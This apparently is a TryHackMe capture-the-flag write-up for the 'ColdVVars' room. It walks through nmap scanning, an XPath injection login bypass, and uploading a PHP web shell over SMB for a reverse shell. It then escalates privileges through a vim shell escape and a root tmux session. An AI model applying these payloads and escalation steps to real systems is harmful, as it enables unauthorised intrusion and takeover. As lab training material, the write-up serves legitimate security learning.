# 87 - ColdVVars (XPath Injection, TMUX eploitation)

Room Link --> [https://tryhackme.com/room/coldvvars](https://tryhackme.com/room/coldvvars)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vvv -T4 10.10.156.47 -sV -p-

PORT     STATE SERVICE     VERSION
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8080/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
8082/tcp open  http        Node.js Express framework
```
{% endcode %}

#### Port 8080

After a quick gobuster I found a new endpoint /dev, can use OPTIONS to bypass the 403,405

```
http://10.10.236.49:8080/dev/
http://10.10.236.49:8080/dev/note.txt
```

```bash
curl 10.10.236.49:8080/dev/note.txt 
```

Contents:

```
Secure File Upload and Testing Functionality
```

#### Port 8082

Home page

```
http://10.10.236.49:8082
```

<figure><img src=".gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>

In the room description, it says "XPath Injection".

* Going through [https://book.hacktricks.xyz/pentesting-web/xpath-injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection)

<figure><img src="https://github.com/CyberLola/COLDVVARS/raw/main/coldvvar/xpath.png" alt=""><figcaption></figcaption></figure>

* Great! Let's try that one then!! Insert `" or 1=1 or "` in the username field ...

<figure><img src="https://github.com/CyberLola/COLDVVARS/raw/main/coldvvar/coldvvar6.png" alt=""><figcaption></figcaption></figure>

* And the credentials we need are the last ones in the list!!

```bash
ArthurMorgan : DeadEye
```

Try them ou for the SMB server.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ smbclient //10.10.156.47/SECURED -U ArthurMorgan

smb: \> ls
  .                                   D        0  Tue Nov 21 18:34:26 2023
  ..                                  D        0  Thu Mar 11 13:52:29 2021
  note.txt                            A       45  Thu Mar 11 13:19:52 2021

		7743660 blocks of size 1024. 4497376 blocks available
```
{% endcode %}

It has `note.txt` , same as the `/dev` directory with note.txt file inside and we have Write Permission meaning we can upload a php web shell.

```bash
smb: \> 
smb: \> put shell.php 
putting file shell.php as \shell.php (16.1 kb/s) (average 16.1 kb/s)
smb: \> ls
  .                                   D        0  Tue Nov 21 18:39:07 2023
  ..                                  D        0  Thu Mar 11 13:52:29 2021
  note.txt                            A       45  Thu Mar 11 13:19:52 2021
  shell.php                           A     9304  Tue Nov 21 18:39:08 2023

		7743660 blocks of size 1024. 4497364 blocks available

```

Setup NC listener and navigate to [http://10.10.156.47:8080/dev/shell.php](http://10.10.156.47:8080/dev/shell.php)

And we got shell.

<figure><img src=".gitbook/assets/image (576).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to ArthurMorgan

We just tried the password we used for the SMB server and it worked.

`su ArthurMorgan`&#x20;

### Priv Esc to Marston

When we type `env` we see an OPEN\_PORT variable.

```
OPEN_PORT=4545
```

```bash
# connect to it via NC.
ArthurMorgan@incognito:~$ nc -nvlp 4545
nc -nvlp 4545
Listening on [0.0.0.0] (family 0, port 4545)
Connection from 127.0.0.1 34874 received!


ideaBox
1.Write
2.Delete
3.Steal others' Trash
4.Show'nExit
```

Selecting it launches VIM, and we can exploit it with GTFOBINS

```bash
:!/bin/bash
```

We get a shell as Marston user.

### Priv Esc to root

When we type `ps aux | grep aux` we see Marston user is running some tmux session.

```bash
marston@incognito:~$ ps aux | grep tmux
ps aux | grep tmux
marston    962  0.0  0.4  28660  2440 ?        Ss   18:18   0:00 tmux new-session -d
marston   2021  0.0  0.2  13144  1028 pts/23   S+   18:32   0:00 grep --color=auto tmux

marston@incognito:~$ tmux ls 	
tmux ls
0: 9 windows (created Tue Nov 21 18:18:39 2023) [80x24]
```

{% hint style="info" %}
A tmux session has 9 opened windows.
{% endhint %}

```bash
# we just kill a few and leave the one running as root.
tmux attach-session -t 0
```

Done!

